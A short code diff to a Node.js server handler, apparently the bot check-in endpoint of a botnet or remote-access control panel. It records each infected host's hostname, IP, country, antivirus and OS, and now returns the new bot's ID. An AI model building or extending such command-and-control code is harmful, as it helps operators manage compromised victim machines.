@@ -67,6 +67,6 @@ exports.reportPost = async (req, res) => {
         return res.sendStatus(400);
     }
 
-    await database.addBot(user.username, hostname, ip, country, av, os);
-    return res.sendStatus(200);
+    const botid = await database.addBot(user.username, hostname, ip, country, av, os);
+    return res.send(botid);
 };
